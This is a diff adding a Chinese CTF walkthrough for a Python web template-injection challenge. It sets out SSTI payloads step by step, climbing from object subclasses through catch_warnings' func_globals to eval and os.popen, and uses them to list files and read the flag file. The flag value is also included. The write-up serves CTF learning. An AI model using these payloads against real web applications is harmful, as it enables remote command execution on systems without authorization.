@@ -662,3 +662,28 @@ data 协议上传 base64 加密后内容：`data://text/plain;base64, JTNDJTNGcG
 <br>
 
 ### Web_python_template_injection
+
+题解：很经典的模板注入题
+
+先在 url 尝试使用模板语法，发现存在 SSTI  
+`/{{''.__class__}}`
+
+套以下代码获取所有子类型  
+`http://223.112.5.156:52404/{{[].__class__.__base__.__subclasses__()}}`
+
+<br>
+
+寻找是否存在 catch_warnings 模块，搜索找到该模块位于第 59 项，故对 59 项进行初始化并提取该模块下属内容  
+`{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}}`
+
+找到函数 lineche，该函数存在 os 模块，通过 os 模块调用命令行查看当前目录下所有文件  
+`{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()')}}`
+
+找到存在一个 fl4g 文件，使用 cat 读取  
+`{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("cat fl4g").read()')}}`
+
+<br>
+
+> 拿到 flag：ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}
+
+<br>
